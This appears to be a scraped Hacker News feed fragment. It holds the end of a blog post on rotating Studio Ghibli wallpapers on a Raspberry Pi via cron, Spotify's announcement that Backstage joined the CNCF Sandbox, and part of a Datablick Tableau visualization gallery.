  <img alt="postfix" title="postfix" src="https://www.charlieharrington.com/static/5af659ddcc5a54584ababc4499e3448d/a6d36/postfix.png" srcset="https://www.charlieharrington.com/static/5af659ddcc5a54584ababc4499e3448d/222b7/postfix.png 163w,
https://www.charlieharrington.com/static/5af659ddcc5a54584ababc4499e3448d/ff46a/postfix.png 325w,
https://www.charlieharrington.com/static/5af659ddcc5a54584ababc4499e3448d/a6d36/postfix.png 650w,
https://www.charlieharrington.com/static/5af659ddcc5a54584ababc4499e3448d/e548f/postfix.png 975w,
https://www.charlieharrington.com/static/5af659ddcc5a54584ababc4499e3448d/3c492/postfix.png 1300w,
https://www.charlieharrington.com/static/5af659ddcc5a54584ababc4499e3448d/bff4e/postfix.png 2660w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>You should choose a "Local" installation. Once we have a mail server, we can now inspect the cron job "mail" logs:</p>
<div data-language="text"><pre><code>sudo tail -f /var/mail/pi</code></pre></div>
<p>After a bunch of email header jargon, we finally see the error:</p>
<div data-language="text"><pre><code>Cannot open display: 

--1332E5E8FA.1601069882/raspberrypi--</code></pre></div>
<p>Awesome! I mean, the cron job still doesn't work, but at least we have some more info. That's a win. So, what have we learned? It seems like our cron job can't "open" the display. Some more Googling suggests that I need to add an env var for the display, so I add this <code>export DISPLAY=:0.0</code> to the beginning on my cron job right after the cron syntax.</p>
<p>Did that fix it? No. But we get a new error message:</p>
<div data-language="text"><pre><code>Message: x-terminal-emulator has very limited support, consider choose another terminal</code></pre></div>
<p>Cool. Okay, so, what does this one mean? This <a href="https://stackoverflow.com/questions/45873124/pcmanfm-set-wallpaper-fails-on-raspbian-stretch-in-cron">stack overflow answer</a> suggests that I may need to add another env var to my command. Here goes:</p>
<div data-language="text"><pre><code>*/10 * * * * export DISPLAY=":0.0" XDG_RUNTIME_DIR=/run/usr/1000  ls /home/pi/Pictures/ghibli | shuf -n 1 | xargs -I{} pcmanfm --set-wallpaper /home/pi/Pictures/ghibli/{}</code></pre></div>
<p>Yes! Our cron job works!</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/7088062c77a79c116dd28f9e93926586/0f98f/karigurashi024.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="marnie" title="marnie" src="https://www.charlieharrington.com/static/7088062c77a79c116dd28f9e93926586/6aca1/karigurashi024.jpg" srcset="https://www.charlieharrington.com/static/7088062c77a79c116dd28f9e93926586/d2f63/karigurashi024.jpg 163w,
https://www.charlieharrington.com/static/7088062c77a79c116dd28f9e93926586/c989d/karigurashi024.jpg 325w,
https://www.charlieharrington.com/static/7088062c77a79c116dd28f9e93926586/6aca1/karigurashi024.jpg 650w,
https://www.charlieharrington.com/static/7088062c77a79c116dd28f9e93926586/7c09c/karigurashi024.jpg 975w,
https://www.charlieharrington.com/static/7088062c77a79c116dd28f9e93926586/01ab0/karigurashi024.jpg 1300w,
https://www.charlieharrington.com/static/7088062c77a79c116dd28f9e93926586/0f98f/karigurashi024.jpg 1920w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>What are these <code>DISPLAY</code> and <code>XDG_RUNTIME_DIR</code>? According to <a href="https://askubuntu.com/questions/872792/what-is-xdg-runtime-dir">this other Stack Overflow answer</a>, <code>DISPLAY</code> is an address for your display and <code>XDG_RUNTIME_DIR</code> is a place to store temporary files for your user. Probably some more to dig into here, but for now, I'm just going to stare at my VNC Viewer and watch the background change.</p>
<p>After all this Googling and debugging, we've now got all these cute images keeping our computer happy, even when we're not there.</p>
<p>Automating stuff like this is part of the magic of computers. And that's why I think it goes so well with these magical Studio Ghibli images.</p>
<h2>Watching the Studio Ghibli films</h2>
<p>But, now I've got a ticking clock... </p>
<p>I hate spoilers, and I'm sad to say that I've only seen Howl's Moving Castle (after reading the book earlier this year). I loved it, much more so than book. Which means I need to watch all the Ghibli films <em>fast</em>, before I spoil my way through them with my desktop backgrounds.</p>
<p>In our first episode of the <a href="https://www.charlieharrington.com/escaping-web-season-one-retrospective">Escaping Web podcast</a>, Oz and I chatted with Felix Tripier who brought up <a href="https://en.wikipedia.org/wiki/Grave_of_the_Fireflies">Grave of the Fireflies</a>. I didn't know about the film during our conversation, but I've just discovered that it's available on Hulu. I'll be watching it very soon. As for the rest of films, I've heard they're on HBO GOMAXPROPLUS in the US and Netflix everywhere else in the world.</p>
<p>For now, I'm just glad to have these images on my little server whenever I log in. It's a nice happy thing in my life, and I thank the orange website for the tiny dose of inspiration.</p></div></div>]]>
            </description>
            <link>https://www.charlieharrington.com/add-some-ghibli-to-your-raspberry-pi</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594812</guid>
            <pubDate>Fri, 25 Sep 2020 22:35:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cloud Native Computing Foundation accepts Backstage as a sandbox project]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24594761">thread link</a>) | @luord
<br/>
September 25, 2020 | https://engineering.atspotify.com/2020/09/24/cloud-native-computing-foundation-accepts-backstage-as-a-sandbox-project/ | <a href="https://web.archive.org/web/*/https://engineering.atspotify.com/2020/09/24/cloud-native-computing-foundation-accepts-backstage-as-a-sandbox-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main" id="main">
    <!-- section -->
    <section>

                <!-- article -->

            <article id="post-3947">
    <!-- post title -->
    

    <div>
        <p><img src="https://engineering.atspotify.com/wp-content/themes/theme-spotify/images/icon.png" alt=""></p><p><span>September 24, 2020</span>
            
        </p>
    </div>
    <!-- post details -->
    <p><a href="https://engineering.atspotify.com/2020/09/24/cloud-native-computing-foundation-accepts-backstage-as-a-sandbox-project/" title="Cloud Native Computing Foundation Accepts Backstage as a Sandbox Project">
                <img src="https://storage.googleapis.com/rnd-atspotify/sites/2/2020/09/Cloud-native-computing-foundation-accepts-Backstage.png" alt="Cloud Native Computing Foundation Accepts Backstage" loading="lazy" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2020/09/Cloud-native-computing-foundation-accepts-Backstage.png 753w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/09/Cloud-native-computing-foundation-accepts-Backstage-250x121.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/09/Cloud-native-computing-foundation-accepts-Backstage-700x337.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/09/Cloud-native-computing-foundation-accepts-Backstage-120x58.png 120w" sizes="(max-width: 753px) 100vw, 753px" data-image-size="post-thumbnail" data-stateless-media-bucket="rnd-atspotify" data-stateless-media-name="sites/2/2020/09/Cloud-native-computing-foundation-accepts-Backstage.png">            </a></p>

    <!-- /post title -->

    
<p>If you hear faint whooping in the background of your playlists today, it‚Äôs just us celebrating a new milestone for Spotify‚Äôs open source efforts: <a href="https://www.cncf.io/" target="_blank" rel="noreferrer noopener">The Cloud Native Computing Foundation (CNCF)</a> has accepted <a href="https://backstage.io/" target="_blank" rel="noreferrer noopener">Backstage</a>, our open source developer portal, as an early stage project in the <a href="https://www.cncf.io/sandbox-projects/" target="_blank" rel="noreferrer noopener">CNCF Sandbox</a>. It‚Äôs just the first step in a longer journey with the CNCF, but it‚Äôs an important one for Spotify as it underlines our renewed commitment to open source ‚Äî and developers everywhere.</p>



<h2>Backstage + CNCF = üéâ</h2>



<p>For those of you unfamiliar with the CNCF, you may recognize them as the home of such hits as Google‚Äôs Kubernetes and Lyft‚Äôs Envoy. With such a strong foundation watching over our community‚Äôs efforts and such an impressive roster of projects leading the way before us, we have high hopes for the future of Backstage ‚Äî one of our most ambitious open source projects to date.</p>



<p>You‚Äôve heard us talk about Backstage before on this blog ‚Äî back in March when we <a href="https://engineering.atspotify.com/2020/03/17/what-the-heck-is-backstage-anyway/" target="_blank" rel="noreferrer noopener">announced the open source project</a> and later when we shared <a href="https://engineering.atspotify.com/2020/04/21/how-we-use-backstage-at-spotify/" target="_blank" rel="noreferrer noopener">how we use Backstage internally at Spotify</a>. In a nutshell: Backstage is an open platform for building developer portals. Built around a centralized service catalog, it‚Äôs designed to streamline your development environment from end to end. We built it to improve the everyday experience and productivity of developers ‚Äî initially, our own developers, and then when we open sourced it, all developers, everywhere.</p>



<h2>Our commitment to improving developer experience</h2>



<p>At Spotify, Backstage enables us to scale safely and onboard quickly, helping us build and ship the product that hundreds of millions of people around the world use every day. We believe it has the potential to transform how all engineers work together, whether they‚Äôre in a 50-person startup or a Fortune 50.&nbsp;</p>



<p>Here‚Äôs what Backstage can do for companies and tech organizations, and how it improves developer experience:</p>



<ul><li><strong>Restore order to software ecosystems.</strong> For companies whose infrastructure has become a wilderness of competing technologies and orphaned dependencies hiding in the dark corners of their tech stack, the <a rel="noreferrer noopener" href="https://backstage.io/blog/2020/06/22/backstage-service-catalog-alpha" target="_blank">Backstage Service Catalog</a> brings back discoverability, accountability, and control ‚Äî not to mention sanity. Instead of being overwhelmed by fragmentation and information sprawl, the Backstage Service Catalog creates a centralized system for tracking all your software ‚Äî making it easy for teams to manage 10 services and making it possible for a company to manage thousands of them.</li></ul>



<ul><li><strong>Jumpstart productivity by standardizing software and tooling.</strong> With software templates, engineers can spin up a new software project in minutes instead of hours. <a rel="noreferrer noopener" href="https://backstage.io/blog/2020/08/05/announcing-backstage-software-templates" target="_blank">Backstage Software Templates</a> are like automated getting started guides. After an engineer chooses a template, Backstage takes care of the rest ‚Äî automatically setting up the repo, deploying the first build, and providing a Hello World project, all ready to go ‚Äî with your organization‚Äôs best practices built right in, right from the start. By reducing the number of low-variance choices a developer is forced to consider when starting a project, templates remove friction and allow developers to spend more cycles solving problems higher up in the stack. Standards can set engineers free.</li></ul>



<ul><li><strong>Get unstuck with great technical documentation made easy. </strong>No one can ever find documentation when they need it ‚Äî and if they do, it might not be that helpful because it hasn‚Äôt been kept up to date. Backstage solves both ends of the problem. With <a rel="noreferrer noopener" href="https://backstage.io/blog/2020/09/08/announcing-tech-docs" target="_blank">our ‚Äúdocs like code‚Äù approach</a>, engineers write their technical documentation in Markdown files right alongside their code. Whenever you create a new project in Backstage, a TechDocs site is automatically set up in the same repo ‚Äî so you can update your code and your documentation with the same pull request. This integrated workflow and centralization makes great documentation easy. Easy to create and maintain. And easy to find and use.</li></ul>



<ul><li><strong>Customize and scale your infrastructure with a growing ecosystems of plugins.</strong> Every company has their own, homegrown infrastructure ‚Äî Backstage‚Äôs plugin architecture makes it simple to make Backstage a perfect fit for yours. Integrating your custom, proprietary tooling is as simple as building an internal plugin for your installation of Backstage. You can also build open source plugins to share with the community. The open source <a rel="noreferrer noopener" href="https://backstage.io/plugins" target="_blank">plugin marketplace</a> for Backstage continues to grow, expanding Backstage‚Äôs functionality with each new plugin. It‚Äôs like an app store for your infrastructure.</li></ul>



<p>Backstage has already come a long way ‚Äî and none of these features would be what they are today without contributions from the open source community.</p>



<h2>Our commitment to the open source community</h2>



<p>We were excited by the reception Backstage received when we first released it. But we‚Äôve been even more gratified by how the community of contributors has grown since then, as they‚Äôve built new <a href="https://backstage.io/plugins" target="_blank" rel="noreferrer noopener">plugins</a> and added new functionality to the core product. Over <a href="https://github.com/spotify/backstage/graphs/contributors" target="_blank" rel="noreferrer noopener">130 people</a> have contributed to the project, and roughly 40% of pull requests are now coming from external, non-Spotify contributors.</p>



<p>As Principal Product Manager <a href="https://engineering.atspotify.com/2020/04/01/my-beat-stefan-alund/" target="_blank" rel="noreferrer noopener">Stefan √Ölund</a> writes on the <a href="https://backstage.io/blog/2020/09/23/backstage-cncf-sandbox" target="_blank" rel="noreferrer noopener">Backstage blog</a>:</p>



<blockquote><div><p>We released the open source version of Backstage ‚Äòearly‚Äô. That was intentional. Because even though we‚Äôve been using Backstage internally for years, we wanted the open source version to be developed with input and contributions from the community. And that‚Äôs exactly the product that‚Äôs going into the CNCF Sandbox today.</p><p>Backstage‚Äôs ability to simplify tooling and standardize engineering practices has attracted interest from other major tech companies, as well as airlines, auto manufacturers, investment firms, and global retailers. We know that Backstage solves a problem ‚Äî infrastructure complexity ‚Äî that‚Äôs common to a lot of large and growing companies today. But different companies work differently, use particular toolsets, and have unique use cases. By making Backstage open source, we can build it with people working inside a variety of engineering organizations all over the world. It makes for a better product that serves a wider group of users (beyond that of Spotify‚Äôs) and their needs.</p></div></blockquote>



<p>Thank you to everyone who has already contributed to this project, inside and outside of Spotify. And if you‚Äôve been curious about Backstage, now is the perfect time to dive in. Visit <a href="https://backstage.io/" target="_blank" rel="noreferrer noopener">Backstage.io</a> to learn more and <a href="https://mailchi.mp/spotify/backstage-community" target="_blank" rel="noreferrer noopener">subscribe to our newsletter</a> for updates. Check out open issues on <a href="https://github.com/spotify/backstage/" target="_blank" rel="noreferrer noopener">GitHub</a> or get started building a <a href="https://backstage.io/plugins" target="_blank" rel="noreferrer noopener">plugin</a> for your favorite tool or service. We look forward to seeing the community grow, and can‚Äôt wait to see where open source takes us all next.</p>



<p>We‚Äôll give Remy DeCausemaker ‚Äî Head of Spotify‚Äôs <a href="https://thenewstack.io/does-your-organization-need-an-open-source-program-office/" target="_blank" rel="noreferrer noopener">Open Source Program Office</a> (OSPO) ‚Äî the last word:&nbsp;</p>



<blockquote><p>We‚Äôre excited to embark on this journey with the CNCF community. Backstage isn‚Äôt the first open source project Spotify has released, but it is the first one we felt was ready to dedicate to an upstream foundation, and we can‚Äôt wait to bring what we‚Äôve learned to the next project. There‚Äôs so much great tech being built here, and it‚Äôs about time we share it to build even greater products, together.</p></blockquote>
    <br>

    
    

    

    
    


</article>

        <!-- /article -->

        
        
    </section>
    <!-- /section -->

    
</div></div>]]>
            </description>
            <link>https://engineering.atspotify.com/2020/09/24/cloud-native-computing-foundation-accepts-backstage-as-a-sandbox-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594761</guid>
            <pubDate>Fri, 25 Sep 2020 22:28:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where Data Meets Art]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24594718">thread link</a>) | @breck
<br/>
September 25, 2020 | https://www.datablick.com/art-gallery | <a href="https://web.archive.org/web/*/https://www.datablick.com/art-gallery">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      

        <div data-click-through-url="http://www.datablick.com/blog/2018/6/4/small-multiple-flows-in-tableau">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="http://www.datablick.com/blog/2018/6/4/small-multiple-flows-in-tableau" data-title="Small Multiple Flows in Tableau" data-description="<p><strong>Small Multiple Flows</strong> live up to their name, combining small multiples and flow elements in a single viz. This allows us to combine a set of events, providing an intense data visualization about these events, while also connecting one event to the next via the flow element. This technique does need a viewer to invest some time into understanding the various pieces of the visual. There is a lot going on, thus it will definitely require effort and a little time on the viewer‚Äôs part (and why I put detailed legends on both visualizations).</p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1538676263290-S8CJDE9E7H8LA7PGW5KK/ke17ZwdGBToddI8pDm48kCZRzknCzu9yIdtjFvPinftZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIvDP22k6gVj36oHy8KKyW5ox2BwvSzzWZ51vWphfwOtk/small-multiple-flows.gif" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1538676263290-S8CJDE9E7H8LA7PGW5KK/ke17ZwdGBToddI8pDm48kCZRzknCzu9yIdtjFvPinftZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIvDP22k6gVj36oHy8KKyW5ox2BwvSzzWZ51vWphfwOtk/small-multiple-flows.gif" data-image-dimensions="800x535" data-image-focal-point="0.5,0.5" alt="Small Multiple Flows in Tableau" data-load="false">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
                <p><strong>Small Multiple Flows</strong> live up to their name, combining small multiples and flow elements in a single viz. This allows us to combine a set of events, providing an intense data visualization about these events, while also connecting one event to the next via the flow element. This technique does need a viewer to invest some time into understanding the various pieces of the visual. There is a lot going on, thus it will definitely require effort and a little time on the viewer‚Äôs part (and why I put detailed legends on both visualizations).</p>
              

              
            

            <!-- Metadata (Below Content) -->
            

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div data-click-through-url="http://www.datablick.com/blog/2017/9/10/lighting-as-an-attentive-attribute-in-kpi-dashboards">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="http://www.datablick.com/blog/2017/9/10/lighting-as-an-attentive-attribute-in-kpi-dashboards" data-title="Lighting as an Attentive Attribute in KPI Dashboards" data-description="<p>About 3 years ago, I saw an exhibit at the <a href=&quot;https://deyoung.famsf.org/&quot; target=&quot;_blank&quot;>deYoung</a> of <a href=&quot;https://en.wikipedia.org/wiki/J._M._W._Turner&quot; target=&quot;_blank&quot;>J. M. W. Turner</a>. It was a painting, ‚Äú<em>Slavers Throwing Overboard the Dead and Dying, Typhon coming on.‚Äù</em></p><p>I have been mulling over his technique of using broadly applied atmospheric washes of paint to draw focus and create intensity, and how to apply it to data visualization. We usually use the attentive attributes of color, size, shape, position, etc. to draw focus in dashboards.</p><p>I have been spending a lot of time pondering the UX of things not related to data viz and asking how to apply those design ideas to visualization work, as with my <a href=&quot;http://www.datablick.com/blog/2017/8/20/tableau-ambient-widgets-the-tiny-moody-relevant-data-experience&quot; target=&quot;_blank&quot;>Widget</a> post. Outside the sphere of data viz, in everything from photography, to video games, and interior design, lighting is a powerful way to draw focus and create emotion. I wanted a <strong>Marks card with a &quot;Lighting&quot; shelf</strong>.</p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1538608573930-CZI1T2PBN14AVQXTMT9L/ke17ZwdGBToddI8pDm48kLEpbdZ5aGcfZNS-qBuUui5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIPdiO7KsD37izOApCpn4bNfEVNo9al-8cbgYrqC4R3L8/TurnerLight.gif" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1538608573930-CZI1T2PBN14AVQXTMT9L/ke17ZwdGBToddI8pDm48kLEpbdZ5aGcfZNS-qBuUui5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIPdiO7KsD37izOApCpn4bNfEVNo9al-8cbgYrqC4R3L8/TurnerLight.gif" data-image-dimensions="881x555" data-image-focal-point="0.5,0.5" alt="Lighting as an Attentive Attribute in KPI Dashboards" data-load="false">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
                <div><p>About 3 years ago, I saw an exhibit at the <a href="https://deyoung.famsf.org/" target="_blank">deYoung</a> of <a href="https://en.wikipedia.org/wiki/J._M._W._Turner" target="_blank">J. M. W. Turner</a>. It was a painting, ‚Äú<em>Slavers Throwing Overboard the Dead and Dying, Typhon coming on.‚Äù</em></p><p>I have been mulling over his technique of using broadly applied atmospheric washes of paint to draw focus and create intensity, and how to apply it to data visualization. We usually use the attentive attributes of color, size, shape, position, etc. to draw focus in dashboards.</p><p>I have been spending a lot of time pondering the UX of things not related to data viz and asking how to apply those design ideas to visualization work, as with my <a href="http://www.datablick.com/blog/2017/8/20/tableau-ambient-widgets-the-tiny-moody-relevant-data-experience" target="_blank">Widget</a> post. Outside the sphere of data viz, in everything from photography, to video games, and interior design, lighting is a powerful way to draw focus and create emotion. I wanted a <strong>Marks card with a "Lighting" shelf</strong>.</p></div>
              

              
            

            <!-- Metadata (Below Content) -->
            

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div data-click-through-url="http://www.datablick.com/blog/2018/3/14/layering-data-for-custom-tableau-visualizations">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="http://www.datablick.com/blog/2018/3/14/layering-data-for-custom-tableau-visualizations" data-title="Layering Data for Custom Tableau Visualizations" data-description="<p>I am going to walk you through a layering technique, which allows use, and re-use of a single axis in Tableau. This can be done at different levels of granularity, different fields entirely or completely synchronized throughout, thus it can adapt pretty well to various use cases. Need to create a dual-axis in a single axis? This technique can enable this for us (as long as you need the same mark type that is).</p><p><strong>So What?</strong> With this technique you can build more detailed and very customized visualizations directly within Tableau (without the need for extensive data prep).</p><p>Here is an example I built out using some data I gathered on the <a href=&quot;http://pbskids.org/&quot; target=&quot;_blank&quot;>PBS Kids</a> show <a href=&quot;http://www.pbs.org/parents/wordgirl/parentsandteachers.html&quot; target=&quot;_blank&quot;>Word Girl</a>, the current (and VERY much) favorite of my 3 and 6 year old daughters. If you want to hear the theme song, un-mute your speakers or plug in your headphones. Also, I have to give <a href=&quot;https://twitter.com/jonni_walker?lang=en&quot; target=&quot;_blank&quot;>Jonni Walker</a> a shout out for some design help, especially in making the edges glow like Word Girl‚Äôs flight trail. Full disclosure, I did learn some new word definitions while working on this project.</p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1539288561001-LETQ0C6STC297Z8PSTPW/ke17ZwdGBToddI8pDm48kG-jclVPWsmUCZRv1Qj3VvpZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI5i16jy1wvWT1OgXKRF1xP_XH8zCeQL_6AYN9biZfMj4/layering-data-tableau.gif" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1539288561001-LETQ0C6STC297Z8PSTPW/ke17ZwdGBToddI8pDm48kG-jclVPWsmUCZRv1Qj3VvpZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI5i16jy1wvWT1OgXKRF1xP_XH8zCeQL_6AYN9biZfMj4/layering-data-tableau.gif" data-image-dimensions="800x676" data-image-focal-point="0.5,0.5" alt="Layering Data for Custom Tableau Visualizations" data-load="false">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
                <div><p>I am going to walk you through a layering technique, which allows use, and re-use of a single axis in Tableau. This can be done at different levels of granularity, different fields entirely or completely synchronized throughout, thus it can adapt pretty well to various use cases. Need to create a dual-axis in a single axis? This technique can enable this for us (as long as you need the same mark type that is).</p><p><strong>So What?</strong> With this technique you can build more detailed and very customized visualizations directly within Tableau (without the need for extensive data prep).</p><p>Here is an example I built out using some data I gathered on the <a href="http://pbskids.org/" target="_blank">PBS Kids</a> show <a href="http://www.pbs.org/parents/wordgirl/parentsandteachers.html" target="_blank">Word Girl</a>, the current (and VERY much) favorite of my 3 and 6 year old daughters. If you want to hear the theme song, un-mute your speakers or plug in your headphones. Also, I have to give <a href="https://twitter.com/jonni_walker?lang=en" target="_blank">Jonni Walker</a> a shout out for some design help, especially in making the edges glow like Word Girl‚Äôs flight trail. Full disclosure, I did learn some new word definitions while working on this project.</p></div>
              

              
            

            <!-- Metadata (Below Content) -->
            

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div data-click-through-url="http://www.datablick.com/blog/2017/11/27/easy-as-pie-d3js-chord-diagrams-in-tableau">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="http://www.datablick.com/blog/2017/11/27/easy-as-pie-d3js-chord-diagrams-in-tableau" data-title="Easy as Pie React + D3 Chord Diagrams in Tableau" data-description="<p><strong>A functional example of Tableau integration with Nivo (React + D3)&amp;nbsp;</strong></p><p>We are going to be integrating with and leveraging <a href=&quot;http://nivo.rocks/#/&quot; target=&quot;_blank&quot;>Nivo</a>, which is self described by <a href=&quot;https://twitter.com/benitteraphael&quot; target=&quot;_blank&quot;>Rapha√´l Benitte</a>&amp;nbsp;(it's creator) as ‚Äúsupercharged React components to easily build dataviz apps, it's built on top of d3.‚Äù Nivo is one of many react component libraries that work on top of <a href=&quot;https://d3js.org/&quot; target=&quot;_blank&quot;>D3</a>, each are different and bring their own features and focus to their projects‚Ä¶</p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1539285445147-58D35H1CM9U25TGUCWZ5/ke17ZwdGBToddI8pDm48kB8BUDNuJ8e4z5MkW1XGNhpZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIBWxI4NHPBOIu_p30A1YgPsgRoWRRiZPDqNFWfj8yRRk/D3-Chord-Diagram.gif" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1539285445147-58D35H1CM9U25TGUCWZ5/ke17ZwdGBToddI8pDm48kB8BUDNuJ8e4z5MkW1XGNhpZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIBWxI4NHPBOIu_p30A1YgPsgRoWRRiZPDqNFWfj8yRRk/D3-Chord-Diagram.gif" data-image-dimensions="800x314" data-image-focal-point="0.5,0.5" alt="Easy as Pie React + D3 Chord Diagrams in Tableau" data-load="false">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
                <div><p><strong>A functional example of Tableau integration with Nivo (React + D3)&nbsp;</strong></p><p>We are going to be integrating with and leveraging <a href="http://nivo.rocks/#/" target="_blank">Nivo</a>, which is self described by <a href="https://twitter.com/benitteraphael" target="_blank">Rapha√´l Benitte</a>&nbsp;(it's creator) as ‚Äúsupercharged React components to easily build dataviz apps, it's built on top of d3.‚Äù Nivo is one of many react component libraries that work on top of <a href="https://d3js.org/" target="_blank">D3</a>, each are different and bring their own features and focus to their projects‚Ä¶</p></div>
              

              
            

            <!-- Metadata (Below Content) -->
            

          </div> <!-- End .summary-content -->

        </div> <!-- End .summary-item -->

      

        <div data-click-through-url="http://www.datablick.com/blog/2017/8/20/tableau-ambient-widgets-the-tiny-moody-relevant-data-experience">

          
            <!-- Thumbnail -->
            

  
  <div>
    <a href="http://www.datablick.com/blog/2017/8/20/tableau-ambient-widgets-the-tiny-moody-relevant-data-experience" data-title="Tableau Ambient Widgets - the tiny, moody, &amp;amp; relevant data experience!" data-description="<p>See that in the <strong>lower left corner</strong>? &amp;nbsp;That would be a live updating Tableau Dashboard as a desktop widget on my Mac. &amp;nbsp;I can keep an eye on things while getting important work done. :-).&amp;nbsp;</p><p>Why did I make this? &amp;nbsp;After school and work my kids and I talk about our day. &amp;nbsp;Sometimes feeling particularly proud of myself, I will show off some dashboard that I have been working on, only to get a &quot;meh&quot; from my kids. Annoyed with the tween eye-roll,&amp;nbsp;I asked Max what he thought was a cool dashboard? &amp;nbsp;He fired up Star Wars Battlefront, and then Halo 5 on his Xbox to show me how the &quot;youngs&quot; think data should be consumed. &amp;nbsp;While in the process of battling the &quot;Dark Side&quot;, Max kept a constant eye scan on the little floating widgets which let him know key things such as the weapon he was using, the position of his team &amp;amp; the opposing team, his health level, etc. </p><p>This got me to thinking about the standard user experience of getting to a dashboard.</p>">
      <p><img data-src="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1539289841042-I9SZ5XPZDRDHIC1F9ZQQ/ke17ZwdGBToddI8pDm48kE-IHWKoHJTy3-aIlN4KpbhZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwTZYKgSgxkZk3JUtbPj7TSYCxlGnywTHzNIJus5m7BaG8uoZ84FZqbFdgLWywYUEk/AmbientTableauDesktopWidget.gif" data-image="https://images.squarespace-cdn.com/content/v1/579900c046c3c4236c931d7b/1539289841042-I9SZ5XPZDRDHIC1F9ZQQ/ke17ZwdGBToddI8pDm48kE-IHWKoHJTy3-aIlN4KpbhZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwTZYKgSgxkZk3JUtbPj7TSYCxlGnywTHzNIJus5m7BaG8uoZ84FZqbFdgLWywYUEk/AmbientTableauDesktopWidget.gif" data-image-dimensions="600x375" data-image-focal-point="0.5,0.5" alt="Tableau Ambient Widgets - the tiny, moody, &amp;amp; relevant data experience!" data-load="false">

    

    

        

        

      </p>
    </a>

    <!-- Products: Quick View -->
    

  </div>
  



          

          <div data-animation-role="content">

            <!-- Metadata (Above Title) -->
            

            
              <!-- Title -->
              
            

            <!-- Metadata (Below Title) -->
            

            
              
            

            
              

              
              <!--- Gallery: Caption Description -->
